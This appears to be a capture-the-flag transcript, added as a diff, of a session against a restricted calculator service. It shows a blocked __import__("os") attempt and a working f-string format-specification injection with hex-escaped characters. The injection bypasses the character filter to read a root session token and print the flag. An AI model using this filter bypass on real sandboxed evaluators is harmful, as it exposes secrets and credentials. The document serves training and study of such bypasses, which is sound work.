@@ -1,0 +1,34 @@
+SO EZ MISC protocol transcript
+Endpoint: nc chal.thjcc.org 9006
+
+--- Arithmetic probe ---
+calc> 1+1
+2
+
+--- Exposed workbook ---
+calc> WB
+Workbook(name='Q3-Financials', sheets={
+  'summary': Sheet(
+    title='Summary',
+    owner=User(name='guest', role='viewer',
+      session=Session(id='sess-0000', token=<Secret value=***REDACTED***>)),
+    cells={'A1': 42, 'A2': 1337}),
+  'audit': Sheet(
+    title='Audit Trail',
+    owner=User(name='auditor', role='root',
+      session=Session(id='sess-c0ffee', token=<Secret value=***REDACTED***>)),
+    cells={'A1': 0})})
+
+--- Direct access is blocked ---
+calc> WB.name
+error: Attribute not supported
+
+calc> WB.sheets["audit"]
+error: banned character '['
+
+calc> __import__("os")
+error: banned character '_'
+
+--- F-string format-specification injection ---
+calc> f"{WB:\x7d\x7b\x5f\x5ffstring\x5f\x5f.sheets\x5baudit\x5d.owner.session.token.value}"
+Workbook(name='Q3-Financials', sheets={...})THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}
